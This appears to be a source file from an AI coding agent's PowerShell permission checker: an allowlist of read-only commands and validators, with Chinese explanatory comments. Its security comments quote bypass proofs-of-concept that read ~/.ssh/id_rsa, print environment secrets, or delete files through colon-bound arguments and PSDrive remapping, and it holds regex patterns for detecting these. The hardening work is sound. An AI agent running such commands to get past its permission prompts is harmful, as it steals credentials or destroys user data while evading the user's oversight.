        '-MethodName',
        '-PropertyName',
        '-QualifierName',
      ],
    },

    // =========================================================================
    // Git - uses shared external command validation with per-flag checking
    // =========================================================================
// git / gh / docker 三者的配置是空对象 {}：
// 它们的校验走下文的 isExternalCommandSafe（用共享的只读子命令表），
// 不走 safeFlags 机制。
    git: {},

    // =========================================================================
    // GitHub CLI (gh) - uses shared external command validation
    // =========================================================================
    gh: {},

    // =========================================================================
    // Docker - uses shared external command validation
    // =========================================================================
    docker: {},

    // =========================================================================
    // Windows-specific system commands
    // =========================================================================
// ipconfig：Windows 上只有 /flag 形式（纯显示），但 macOS 上 `ipconfig set ...`
// 会**修改网络配置**。所以这里额外挂一个回调：**拒绝任何位置参数**，
// 只放行裸 ipconfig 和 /all 这类显示型 flag。
    ipconfig: {
      // SECURITY: On macOS, `ipconfig set <iface> <mode>` configures network
      // (writes system config). safeFlags only validates FLAGS, positional args
      // are SKIPPED. Reject any positional argument — only bare `ipconfig` or
      // `ipconfig /all` (read-only display) allowed. Windows ipconfig only uses
      // /flags (display), macOS ipconfig uses subcommands (get/set/waitall).
      safeFlags: ['/all', '/displaydns', '/allcompartments'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        return (element?.args ?? []).some(
          a => !a.startsWith('/') && !a.startsWith('-'),
        )
      },
    },
    netstat: {
      safeFlags: [
        '-a',
        '-b',
        '-e',
        '-f',
        '-n',
        '-o',
        '-p',
        '-q',
        '-r',
        '-s',
        '-t',
        '-x',
        '-y',
      ],
    },
    systeminfo: {
      safeFlags: ['/FO', '/NH'],
    },
    tasklist: {
      safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
    },
    // where.exe: Windows PATH locator, bash `which` equivalent. Reaches here via
    // SAFE_EXTERNAL_EXES bypass at the nameType gate in isAllowlistedCommand.
    // All flags are read-only (/R /F /T /Q), matching bash's treatment of `which`
    // in BashTool READONLY_COMMANDS.
// where.exe ≈ bash 的 which：只是在 PATH 里找文件，纯只读。
// 它名字里有点号（where.exe），会被 nameType 判成 'application' 而拦下，
// 所以要在 SAFE_EXTERNAL_EXES 里给它开个旁路（见 964 行）。
    'where.exe': {
      allowAllFlags: true,
    },
// hostname：Linux/macOS 上 `hostname NAME` 是**设置**主机名（写系统配置）！
// 所以同样挂回调拒绝位置参数，只放行裸命令和显示型 flag。
    hostname: {
      // SECURITY: `hostname NAME` on Linux/macOS SETS the hostname (writes to
      // system config). `hostname -F FILE` / `--file=FILE` also sets from file.
      // Only allow bare `hostname` and known read-only flags.
      safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // Reject any positional (non-flag) argument — sets hostname.
        return (element?.args ?? []).some(a => !a.startsWith('-'))
      },
    },
    whoami: {
      safeFlags: [
        '/user',
        '/groups',
        '/claims',
        '/priv',
        '/logonid',
        '/all',
        '/fo',
        '/nh',
      ],
    },
    ver: {
      allowAllFlags: true,
    },
    arp: {
      safeFlags: ['-a', '-g', '-v', '-N'],
    },
// route：只有 `route print` 是只读的，route add/change/delete 都会改路由表。
// 关键教训（见上方英文注释）：老代码用 args.some('print') 判断，
// 于是 `route add 10.0.0.0 ... print`（末尾带个 print）被误判成安全。
// 正确做法是找**第一个非 flag 的位置参数**当动词（route.exe 的语法就是这样）。
    route: {
      safeFlags: ['print', 'PRINT', '-4', '-6'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // SECURITY: route.exe syntax is `route [-f] [-p] [-4|-6] VERB [args...]`.
        // The first non-flag positional is the verb. `route add 10.0.0.0 mask
        // 255.0.0.0 192.168.1.1 print` adds a route (print is a trailing display
        // modifier). The old check used args.some('print') which matched 'print'
        // anywhere — position-insensitive.
        if (!element) {
          return true
        }
        const verb = element.args.find(a => !a.startsWith('-'))
        return verb?.toLowerCase() !== 'print'
      },
    },
// netsh **刻意不加入白名单**：它的语法太复杂（三层上下文嵌套、
// -f 和 /f 两种前缀、能执行脚本、能远程 RPC、wlan 连接/断开…），
// 连续三轮补黑名单都补不全。结论：太复杂的命令宁可一律弹框。
    // netsh: intentionally NOT allowlisted. Three rounds of denylist gaps in PR
    // #22060 (verb position → dash flags → slash flags → more verbs) proved
    // the grammar is too complex to allowlist safely: 3-deep context nesting
    // (`netsh interface ipv4 show addresses`), dual-prefix flags (-f / /f),
    // script execution via -f and `exec`, remote RPC via -r, offline-mode
    // commit, wlan connect/disconnect, etc. Each denylist expansion revealed
    // another gap. `route` stays — `route print` is the only read-only form,
    // simple single-verb-position grammar.
    getmac: {
      safeFlags: ['/FO', '/NH', '/V'],
    },

    // =========================================================================
    // Cross-platform CLI tools
    // =========================================================================
    // File inspection
// file 命令的 -C（编译 magic 数据库）会**写磁盘**，所以只列查询型 flag。
    // SECURITY: file -C compiles a magic database and WRITES to disk. Only
    // allow introspection flags; reject -C / --compile / -m / --magic-file.
    file: {
      safeFlags: [
        '-b',
        '--brief',
        '-i',
        '--mime',
        '-L',
        '--dereference',
        '--mime-type',
        '--mime-encoding',
        '-z',
        '--uncompress',
        '-p',
        '--preserve-date',
        '-k',
        '--keep-going',
        '-r',
        '--raw',
        '-v',
        '--version',
        '-0',
        '--print0',
        '-s',
        '--special-files',
        '-l',
        '-F',
        '--separator',
        '-e',
        '-P',
        '-N',
        '--no-pad',
        '-E',
        '--extension',
      ],
    },
    tree: {
      safeFlags: ['/F', '/A', '/Q', '/L'],
    },
    findstr: {
      safeFlags: [
        '/B',
        '/E',
        '/L',
        '/R',
        '/S',
        '/I',
        '/X',
        '/V',
        '/N',
        '/M',
        '/O',
        '/P',
// findstr 的 /C /G /D /A 这些 flag 后面会跟冒号值（/C:pattern），
// 而 flag 比较时会先把冒号之后的内容削掉，所以表里**不能**写冒号。
        // Flag matching strips ':' before comparison (e.g., /C:pattern → /C),
        // so these entries must NOT include the trailing colon.
        '/C',
        '/G',
        '/D',
        '/A',
      ],
    },

    // =========================================================================
    // Package managers - uses shared external command validation
    // =========================================================================
    dotnet: {},

// man / help 的条目被移除：它们别名到 Get-Help（也已移除）——
// 于是查表时会经 COMMON_ALIASES 解析成 'get-help'，不在表里 → 弹框。
// 这是「移除一个，连带别名一起失效」的连锁效应。
    // SECURITY: man and help direct entries REMOVED. They aliased Get-Help
    // (also removed — see above). Without these entries, lookupAllowlist
    // resolves via COMMON_ALIASES to 'get-help' which is not in allowlist →
    // prompt. Same module-autoload hazard as Get-Help.
  },
)

/**
 * 【中文】「纯输出类」cmdlet 名单：可以安全地接收管道输入，不改变前面命令的语义。
 * 注意这是**只看命令名**的检查（不校验参数），所以收录标准极严。
 */
/**
 * Safe output/formatting cmdlets that can receive piped input.
 * Stored as canonical cmdlet names in lowercase.
 */
// 现在集合里只剩 out-null（它把输入全部丢弃，连 -InputObject 泄漏都没有）。
// 上方长注释解释了为什么 Format-* / Select-* / Out-String / Write-Output 等
// **都不该**待在这里：只看名字的话，危险的参数会在参数校验之前被跳过。
const SAFE_OUTPUT_CMDLETS = new Set([
  'out-null',
  // NOT out-string/out-host — both accept -InputObject which leaks args the
  // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argLeaksValue.
  // `Get-Process | Out-String -InputObject $env:SECRET` — Out-String was
  // filtered name-only, the $env arg was never validated.
  // out-null stays: it discards everything, no -InputObject leak.
  // NOT foreach-object / where-object / select-object / sort-object /
  // group-object / format-table / format-list / format-wide / format-custom /
  // measure-object — ALL accept calculated-property hashtables or script-block
  // predicates that evaluate arbitrary expressions at runtime
  // (about_Calculated_Properties). Examples:
  //   Where-Object @{k=$env:SECRET}       — HashtableAst arg, 'Other' elementType
  //   Select-Object @{N='x';E={...}}      — calculated property scriptblock
  //   Format-Table $env:SECRET            — positional -Property, prints as header
  //   Measure-Object -Property $env:SECRET — leaks via "property 'sk-...' not found"
  //   ForEach-Object { $env:PATH='e' }    — arbitrary script body
  // isSafeOutputCommand is a NAME-ONLY check — step-5 filters these out of
  // the approval loop BEFORE arg validation runs. With them here, an
  // all-safe-output tail auto-allows on empty subCommands regardless of
  // what the arg contains. Removing them forces the tail through arg-level
  // validation (hashtable is 'Other' elementType → fails the whitelist at
  // isAllowlistedCommand → ask; bare $var is 'Variable' → same).
  //
  // NOT write-output — pipeline-initial $env:VAR is a VariableExpressionAst,
  // skipped by getSubCommandsForPermissionCheck (non-CommandAst). With
  // write-output here, `$env:SECRET | Write-Output` → WO filtered as
  // safe-output → empty subCommands → auto-allow → secret prints. The
  // CMDLET_ALLOWLIST entry handles direct `Write-Output 'literal'`.
])

/**
 * 【中文】从 SAFE_OUTPUT_CMDLETS 搬去 CMDLET_ALLOWLIST 的那批「管道尾部变换器」。
 *
 * 用途：isAllowlistedPipelineTail 为调用方提供「跳过无害管道尾巴」的能力，
 *       但必须**连同参数校验一起**（argLeaksValue），比 SAFE_OUTPUT_CMDLETS 更严。
 * 刻意不覆盖整张白名单，只覆盖这批迁移过来的命令 —— 范围要窄。
 */
/**
 * Cmdlets moved from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST with
 * argLeaksValue. These are pipeline-tail transformers (Format-*,
 * Measure-Object, Select-Object, etc.) that were previously name-only
 * filtered as safe-output. They now require arg validation (argLeaksValue
 * blocks calculated-property hashtables / scriptblocks / variable args).
 *
 * Used by isAllowlistedPipelineTail for the narrow fallback in
 * checkPermissionMode and isReadOnlyCommand — these callers need the same
 * "skip harmless pipeline tail" behavior as SAFE_OUTPUT_CMDLETS but with
 * the argLeaksValue guard.
 */
const PIPELINE_TAIL_CMDLETS = new Set([
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  'measure-object',
  'select-object',
  'sort-object',
  'group-object',
  'where-object',
  'out-string',
  'out-host',
])

/**
 * 【中文】允许穿过 nameType='application' 闸门的**外部 exe** 名单。
 *
 * 背景：classifyCommandName 见到名字里有点号就判成 'application'，
 * 那道闸门本意是拦 `scripts\Get-Process` 这类伪装（削掉前缀后像内置 cmdlet），
 * 但它把 where.exe 这种从 PATH 解析的良性命令也一起拦了。
 *
 * 关键安全细节（见上方英文注释）：旁路比对的是 cmd.text 的第一个 token
 * （原始文本），**不是** cmd.name —— 因为 cmd.name 已被削掉路径前缀，
 * 拿它比对就又回到了 scripts\where.exe 能被放行的老问题。
 */
/**
 * External .exe names allowed past the nameType='application' gate.
 *
 * classifyCommandName returns 'application' for any name containing a dot,
 * which the nameType gate at isAllowlistedCommand rejects before allowlist
 * lookup. That gate exists to block scripts\Get-Process → stripModulePrefix →
 * cmd.name='Get-Process' spoofing. But it also catches benign PATH-resolved
 * .exe names like where.exe (bash `which` equivalent — pure read, no dangerous
 * flags).
 *
 * SECURITY: the bypass checks the raw first token of cmd.text, NOT cmd.name.
 * stripModulePrefix collapses scripts\where.exe → cmd.name='where.exe', but
 * cmd.text preserves the raw 'scripts\where.exe ...'. Matching cmd.text's
 * first token defeats that spoofing — only a bare `where.exe` (PATH lookup)
 * gets through.
 *
 * Each entry here MUST have a matching CMDLET_ALLOWLIST entry for flag
 * validation.
 */
const SAFE_EXTERNAL_EXES = new Set(['where.exe'])

/**
 * 【中文】Windows 的 PATHEXT 后缀：git.exe / git.cmd / git.bat / git.com
 * 在运行时**都是** git，所以必须解析成同一个规范名，否则 git 相关的安全守卫
 * （钩子、gitSafety）会因为名字对不上而失效。
 * .ps1 刻意排除：一个叫 git.ps1 的脚本不是 git 本体，也不触发 git 的钩子机制。
 */
/**
 * Windows PATHEXT extensions that PowerShell resolves via PATH lookup.
 * `git.exe`, `git.cmd`, `git.bat`, `git.com` all invoke git at runtime and
 * must resolve to the same canonical name so git-safety guards fire.
 * .ps1 is intentionally excluded — a script named git.ps1 is not the git
 * binary and does not trigger git's hook mechanism.
 */
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/

/**
 * 【中文】把命令名解析成**规范名**：小写化 → 去 Windows 后缀 → 查别名表。
 *
 * 为什么要统一走这个函数：不归一化的话，ls / dir / Get-ChildItem 是三个名字，
 * 白名单里写一个就漏另外两个 —— 别名绕过是最常见的绕过手法。
 *
 * @param name 原始命令名
 * @returns 小写规范名（如 git.exe → git，rm → remove-item）
 *
 * 关键限制（安全相关）：**只在名字不含路径分隔符时**才剥后缀。
 *   `scripts\git.exe` 是相对路径，跑的是本地脚本，不是 PATH 上的 git ——
 *   若也剥成 git，就会让 git 守卫误以为在调真 git（实际不是）。
 */
/**
 * Resolves a command name to its canonical cmdlet name using COMMON_ALIASES.
 * Strips Windows executable extensions (.exe, .cmd, .bat, .com) from path-free
 * names so e.g. `git.exe` canonicalises to `git` and triggers git-safety
 * guards (powershellPermissions.ts hasGitSubCommand). SECURITY: only strips
 * when the name has no path separator — `scripts\git.exe` is a relative path
 * (runs a local script, not PATH-resolved git) and must NOT canonicalise to
 * `git`. Returns lowercase canonical name.
 */
export function resolveToCanonical(name: string): string {
  let lower = name.toLowerCase()
  // Only strip PATHEXT on bare names — paths run a specific file, not the
  // PATH-resolved executable the guards are protecting against.
  if (!lower.includes('\\') && !lower.includes('/')) {
    lower = lower.replace(WINDOWS_PATHEXT, '')
  }
// 查别名表。注意 COMMON_ALIASES 本身也是用 Object.create(null) 建的，
// 查不到返回 undefined（而不是继承来的属性）。
  const alias = COMMON_ALIASES[lower]
  if (alias) {
    return alias.toLowerCase()
  }
  return lower
}

/**
 * 【中文】这条命令会不会改变**后续相对路径的解析基准**？
 *
 * 两类（对应上方英文注释）：
 *   ① 改当前目录：Set-Location / Push-Location / Pop-Location（别名 cd/sl/chdir/pushd/popd）
 *   ② 新建 PSDrive：New-PSDrive（别名 ndr/mount）——
 *      之后写 p:/passwd，实际解析到新建驱动器指向的根（比如 /etc）。
 *
 * 为什么要管：一旦基准变了，**后面语句里的相对路径**在校验时和运行时
 * 指向的不是同一个地方（校验用的是陈旧的 cwd），路径校验就失效了。
 *
 * 函数名沿用 BashTool 的 isCwdChangingCmdlet（对应那边的 compoundCommandHasCd），
 * 但语义其实是「改变了路径解析命名空间」。
 */
/**
 * Checks if a command name (after alias resolution) alters the path-resolution
 * namespace for subsequent statements in the same compound command.
 *
 * Covers TWO classes:
 * 1. Cwd-changing cmdlets: Set-Location, Push-Location, Pop-Location (and
 *    aliases cd, sl, chdir, pushd, popd). Subsequent relative paths resolve
 *    from the new cwd.
 * 2. PSDrive-creating cmdlets: New-PSDrive (and aliases ndr, mount on Windows).
 *    Subsequent drive-prefixed paths (p:/foo) resolve via the new drive root,
 *    not via the filesystem. Finding #21: `New-PSDrive -Name p -Root /etc;
 *    Remove-Item p:/passwd` — the validator cannot know p: maps to /etc.
 *
 * Any compound containing one of these cannot have its later statements'
 * relative/drive-prefixed paths validated against the stale validator cwd.
 *
 * Name kept for BashTool parity (isCwdChangingCmdlet ↔ compoundCommandHasCd);
 * semantically this is "alters path-resolution namespace".
 */
export function isCwdChangingCmdlet(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return (
    canonical === 'set-location' ||
    canonical === 'push-location' ||
    canonical === 'pop-location' ||
    // New-PSDrive creates a drive mapping that redirects <name>:/... paths
    // to an arbitrary filesystem root. Aliases ndr/mount are not in
    // COMMON_ALIASES — check them explicitly (finding #21).
// ndr / mount 只在 **Windows** 上才是 New-PSDrive 的别名；
// 在 POSIX 上 mount 是系统自带的 mount(8) 命令，
// 一刀切会把正常的 mount 判成危险（误报）。所以要加平台判断。
    canonical === 'new-psdrive' ||
    // ndr/mount are PS aliases for New-PSDrive on Windows only. On POSIX,
    // 'mount' is the native mount(8) command; treating it as PSDrive-creating
    // would false-positive. (bug #15 / review nit)
    (getPlatform() === 'windows' &&
      (canonical === 'ndr' || canonical === 'mount'))
  )
}

/**
 * 【中文】是否是「纯输出类」cmdlet（**只看名字**，不校验参数）。
 * 因为不看参数，调用方只有在命令**没有参数**时才能放心地短路放行。
 */
/**
 * Checks if a command name (after alias resolution) is a safe output cmdlet.
 */
export function isSafeOutputCommand(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return SAFE_OUTPUT_CMDLETS.has(canonical)
}

/**
 * 【中文】是否是「无害的管道尾部变换器」（Format-Table / Select-Object 等），
 * 并且**通过了参数校验**。
 *
 * 为什么需要它：这些命令从 SAFE_OUTPUT_CMDLETS 搬走后，
 * 调用方（如 modeValidation）仍需要「尾巴无害就跳过」的行为，
 * 但必须带上 argLeaksValue 校验，不能只按名字放行。
 */
/**
 * Checks if a command element is a pipeline-tail transformer that was moved
 * from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST (PIPELINE_TAIL_CMDLETS set)
 * AND passes its argLeaksValue guard via isAllowlistedCommand.
 *
 * Narrow fallback for isSafeOutputCommand call sites that need to keep the
 * "skip harmless pipeline tail" behavior for Format-Table / Select-Object / etc.
 * Does NOT match the full CMDLET_ALLOWLIST — only the migrated transformers.
 */
export function isAllowlistedPipelineTail(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  const canonical = resolveToCanonical(cmd.name)
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false
  }
  return isAllowlistedCommand(cmd, originalCommand)
}

/**
 * 【中文】这条语句的形状是不是**我们能 100% 验证**的那种？
 *
 * 只有「是 PipelineAst 且每个元素都是 CommandAst」才返回 true ——
 * 赋值语句、控制流、表达式源、&& 链条这些统统返回 false。
 *
 * 为什么这么严（fail-closed）：将来 PowerShell 新增任何 AST 类型，
 * 都会**自动落到 false**（因为只有一条通往 true 的路径），
 * 不会因为「没考虑到」而被误放行。这种「新增类型默认安全」的设计很值得学。
 */
/**
 * Fail-closed gate for read-only auto-allow. Returns true ONLY for a
 * PipelineAst where every element is a CommandAst — the one statement
 * shape we can fully validate. Everything else (assignments, control
 * flow, expression sources, chain operators) defaults to false.
 *
 * Single code path to true. New AST types added to PowerShell fall
 * through to false by construction.
 */
export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
  if (stmt.statementType !== 'PipelineAst') return false
// 空命令也返回 false：虽然下面的循环对空数组会「空过」（vacuously true），
// 但这里是承重环节，宁可对解析器的边界情况多防一层。
  // Empty commands → vacuously passes the loop below. PowerShell's
  // parser guarantees PipelineAst.PipelineElements ≥ 1 for valid source,
  // but this gate is the linchpin — defend against parser/JSON edge cases.
  if (stmt.commands.length === 0) return false
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== 'CommandAst') return false
  }
  return true
}

/**
 * 【中文】查白名单：先按原名查，查不到就解析成规范名再查一次。
 * @returns 命中返回配置；否则 undefined（调用方据此拒绝放行）
 */
/**
 * Looks up a command in the allowlist, resolving aliases first.
 * Returns the config if found, or undefined.
 */
function lookupAllowlist(name: string): CommandConfig | undefined {
  const lower = name.toLowerCase()
  // Direct lookup first
  const direct = CMDLET_ALLOWLIST[lower]
  if (direct) {
    return direct
  }
  // Resolve alias to canonical and look up
  const canonical = resolveToCanonical(lower)
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical]
  }
  return undefined
}

/**
 * 【中文】**同步**版安全预筛：用正则扫一遍命令文本，命中任一可疑模式就返回 true。
 *
 * 为什么需要「同步版」：PowerShellTool.isReadOnly() 是同步接口，
 * 拿不到（异步解析的）AST，只能先做一层便宜的正则筛查。
 * 它对应 BashTool 里的 checkReadOnlyConstraints。
 *
 * @param command 原始命令文本
 * @returns true = 有安全疑虑，**不要**当只读处理
 */
/**
 * Sync regex-based check for security-concerning patterns in a PowerShell command.
 * Used by isReadOnly (which must be sync) as a fast pre-filter before the
 * cmdlet allowlist check. This mirrors BashTool's checkReadOnlyConstraints
 * which checks bashCommandIsSafe_DEPRECATED before evaluating read-only status.
 *
 * Returns true if the command contains patterns that indicate it should NOT
 * be considered read-only, even if the cmdlet is in the allowlist.
 */
export function hasSyncSecurityConcerns(command: string): boolean {
  const trimmed = command.trim()
  if (!trimmed) {
    return false
  }

// ① 子表达式 $(...)：里面能塞任意代码。
  // Subexpressions: $(...) can execute arbitrary code
  if (/\$\(/.test(trimmed)) {
    return true
  }

// ② splatting @var：把整个哈希表当参数展开，内容不可见。
// 注意正则要求 @ 前面是行首或非单词字符 —— 否则 user@example.com 会被误判。
  // Splatting: @variable passes arbitrary parameters. Real splatting is
  // token-start only — `@` preceded by whitespace/separator/start, not mid-word.
  // `[^\w.]` excludes word chars and `.` so `user@example.com` (email) and
  // `file.@{u}` don't match, but ` @splat` / `;@splat` / `^@splat` do.
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true
  }

// ③ .Method()：调用任意 .NET 方法。
  // Member invocations: .Method() can call arbitrary .NET methods
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true
  }

// ④ 赋值 $var = ...：会改状态。
  // Assignments: $var = ... can modify state
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true
  }

// ⑤ --%：停止解析标记，后面的内容 PowerShell 不再解析（我们也就看不到了）。
  // Stop-parsing symbol: --% passes everything raw to native commands
  if (/--%/.test(trimmed)) {
    return true
  }

// ⑥ UNC 路径 \\server\share：会触发网络请求，还可能泄漏 NTLM/Kerberos 凭据。
// （正则里 (?<!:) 的否定后顾是为了排除 URL 里的 http:// 那种双斜杠。）
  // UNC paths: \\server\share or //server/share can trigger network requests
  // and leak NTLM/Kerberos credentials
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search, short command strings
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true
  }

// ⑦ [Type]::Method()：调用静态 .NET 方法。
  // Static method calls: [Type]::Method() can invoke arbitrary .NET methods
  if (/::/.test(trimmed)) {
    return true
  }

  return false
}

/**
 * 【中文】**对外主入口**：整条命令是不是只读的？
 *
 * @param command 原始命令文本（外部命令校验时需要原文）
 * @param parsed AST 解析结果；**不给**就直接返回 false（拿不到 AST 就不能确定）
 * @returns true = 只读，可以自动放行；false = 弹框问用户
 *
 * 检查顺序（层层收紧，任一不过就 false）：
 *   ① 空命令 / 没 AST / 解析失败 → false
 *   ② 含脚本块、子表达式、可展开串、splatting、成员调用、赋值、--% → false
 *   ③ 没有任何管道段 → false
 *   ④ 复合命令里含「改路径基准」的 cmdlet → false（相对路径会失真）
 *   ⑤ 每段：有重定向到**文件**的 → false（> $null 除外，那只是丢弃输出）
 *   ⑥ 每段第一条命令必须在白名单且参数合规
 *   ⑦ 管道下游命令必须是纯输出类（且**无参数**）或同样在白名单且参数合规
 *   ⑧ 有嵌套命令（脚本块里的子命令等）→ false
 */
/**
 * Checks if a PowerShell command is read-only based on the cmdlet allowlist.
 *
 * @param command - The original PowerShell command string
 * @param parsed - The AST-parsed representation of the command
 * @returns true if the command is read-only, false otherwise
 */
export function isReadOnlyCommand(
  command: string,
  parsed?: ParsedPowerShellCommand,
): boolean {
  const trimmedCommand = command.trim()
  if (!trimmedCommand) {
    return false
  }

// 拿不到 AST 就一律 false —— 宁可多弹一次框，也不能凭猜测放行。
  // If no parsed AST available, conservatively return false
  if (!parsed) {
    return false
  }

  // If parsing failed, reject
  if (!parsed.valid) {
    return false
  }

  const security = deriveSecurityFlags(parsed)
  // Reject commands with script blocks — we can't verify the code inside them
  // e.g., Get-Process | ForEach-Object { Remove-Item C:\foo } looks like a safe pipeline
  // but the script block contains destructive code
  if (
    security.hasScriptBlocks ||
    security.hasSubExpressions ||
    security.hasExpandableStrings ||
    security.hasSplatting ||
    security.hasMemberInvocations ||
    security.hasAssignments ||
    security.hasStopParsing
  ) {
    return false
  }

  const segments = getPipelineSegments(parsed)

  if (segments.length === 0) {
    return false
  }

// 复合命令 + cd 类命令 → false。典型的绕过例子（对应上方英文注释）：
//   Set-Location ~; Get-Content ./.ssh/id_rsa
// 两个 cmdlet **都在白名单里**，但路径校验用的是校验时的 cwd（/project），
// 于是 ./.ssh/id_rsa 看起来在允许范围内；运行时 PowerShell 已经 cd 到 ~，
// 读的是真的 ~/.ssh/id_rsa。所以只要复合命令里出现 cd 类，一律不放行。
  // SECURITY: Block compound commands that contain a cwd-changing cmdlet
  // (Set-Location/Push-Location/Pop-Location/New-PSDrive) alongside any other
  // statement. This was previously scoped to cd+git only, but that overlooked
  // the isReadOnlyCommand auto-allow path for cd+read compounds (finding #27):
  //   Set-Location ~; Get-Content ./.ssh/id_rsa
  // Both cmdlets are in CMDLET_ALLOWLIST, so without this guard the compound
  // auto-allows. Path validation resolved ./.ssh/id_rsa against the STALE
  // validator cwd (e.g. /project), missing any Read(~/.ssh/**) deny rule.
  // At runtime PowerShell cd's to ~, reads ~/.ssh/id_rsa.
  //
  // Any compound containing a cwd-changing cmdlet cannot be auto-classified
  // read-only when other statements may use relative paths — those paths
  // resolve differently at runtime than at validation time. BashTool has the
  // equivalent guard via compoundCommandHasCd threading into path validation.
  const totalCommands = segments.reduce(
    (sum, seg) => sum + seg.commands.length,
    0,
  )
  if (totalCommands > 1) {
    const hasCd = segments.some(seg =>
      seg.commands.some(cmd => isCwdChangingCmdlet(cmd.name)),
    )
    if (hasCd) {
      return false
    }
  }

  // Check each statement individually - all must be read-only
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false
    }

// 重定向：写文件当然不算只读；但 `> $null`（丢弃输出）不算写文件，要放行，
// 否则大量常见命令会被误伤。
    // Reject file redirections (writing to files). `> $null` discards output
    // and is not a filesystem write, so it doesn't disqualify read-only status.
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        r => !r.isMerging && !isNullRedirectionTarget(r.target),
      )
      if (hasFileRedirection) {
        return false
      }
    }

// 只看**第一条**命令是否在白名单：管道的第一段决定这条语句的性质。
    // First command must be in the allowlist
    const firstCmd = pipeline.commands[0]
    if (!firstCmd) {
      return false
    }

    if (!isAllowlistedCommand(firstCmd, command)) {
      return false
    }

    // Remaining pipeline commands must be safe output cmdlets OR allowlisted
    // (with arg validation). Format-Table/Measure-Object moved from
    // SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST after security review found all
    // accept calculated-property hashtables. isAllowlistedCommand runs their
    // argLeaksValue callback: bare `| Format-Table` passes, `| Format-Table
    // $env:SECRET` fails. SECURITY: nameType gate catches 'scripts\\Out-Null'
    // (raw name has path chars → 'application'). cmd.name is stripped to
    // 'Out-Null' which would match SAFE_OUTPUT_CMDLETS, but PowerShell runs
    // scripts\\Out-Null.ps1.
// 管道下游：先看 nameType（防 scripts\Out-Null 这类伪装），
// 再看是否是「无参数的纯输出命令」，否则必须走完整的白名单 + 参数校验。
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i]
      if (!cmd || cmd.nameType === 'application') {
        return false
      }
      // SECURITY: isSafeOutputCommand is name-only; only short-circuit for
      // zero-arg invocations. Out-String -InputObject:(rm x) — the paren is
      // evaluated when Out-String runs. With name-only check and args, the
      // colon-bound paren bypasses. Force isAllowlistedCommand (arg validation)
      // when args present — Out-String/Out-Null/Out-Host are NOT in
      // CMDLET_ALLOWLIST so any args will reject.
      //   PoC: Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
      //   → auto-allow → Remove-Item runs.
// 关键安全点：isSafeOutputCommand 只看名字，**必须**同时要求零参数才短路。
// 否则 `Out-String -InputObject:(Remove-Item /tmp/x)` 这种
// 把命令塞进冒号绑定值的写法会被放行，运行时真的执行了 Remove-Item。
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false
      }
    }

// 嵌套命令 = 脚本块/括号表达式里的子命令，
// 它们绕过了上面逐个命令的白名单检查，所以一律拒绝。
    // SECURITY: Reject statements with nested commands. nestedCommands are
    // CommandAst nodes found inside script block arguments, ParenExpressionAst
    // children of colon-bound parameters, or other non-top-level positions.
    // A statement with nestedCommands is by definition not a simple read-only
    // invocation — it contains executable sub-pipelines that bypass the
    // per-command allowlist check above.
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false
    }
  }

  return true
}

/**
 * 【中文】**单条命令**是否在白名单里、且参数全部合规？
 *
 * @param cmd 单个命令元素（含 name/args/elementTypes/children/nameType/text）
 * @param originalCommand 原始命令文本（供 regex 约束与回调使用）
 * @returns true = 可自动放行
 *
 * 检查顺序：
 *   ① nameType='application'（名字像路径）→ 拒绝（除非是 SAFE_EXTERNAL_EXES 里的）
 *   ② 查白名单，查不到 → 拒绝
 *   ③ 有 regex 约束 → 拿原文去匹配
 *   ④ 有自定义危险回调 → 调它
 *   ⑤ 参数**类型**白名单：只接受 StringConstant / Parameter
 *   ⑥ 外部命令（git/gh/docker/dotnet）→ 转交 isExternalCommandSafe
 *   ⑦ 剩下的走 flag 白名单校验（safeFlags / allowAllFlags）
 */
/**
 * Checks if a single command element is in the allowlist and passes flag validation.
 */
export function isAllowlistedCommand(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
// nameType='application' 表示**原始**名字里含路径字符（. \ /），
// 例如 scripts\Get-Process、./git、node.exe。PowerShell 会当文件路径去解析，
// 跑的不是名字被削掉前缀后看起来像的那个 cmdlet —— 一律不自动放行。
// 代价：Microsoft.PowerShell.Management\Get-ChildItem 这种模块限定名也会被拦，
// 但那种写法很罕见，多弹一次框可以接受。
  // SECURITY: nameType is computed from the raw (pre-stripModulePrefix) name.
  // 'application' means the raw name contains path chars (. \\ /) — e.g.
  // 'scripts\\Get-Process', './git', 'node.exe'. PowerShell resolves these as
  // file paths, not as the cmdlet/command the stripped name matches. Never
  // auto-allow: the allowlist was built for cmdlets, not arbitrary scripts.
  // Known collateral: 'Microsoft.PowerShell.Management\\Get-ChildItem' also
  // classifies as 'application' (contains . and \\) and will prompt. Acceptable
  // since module-qualified names are rare in practice and prompting is safe.
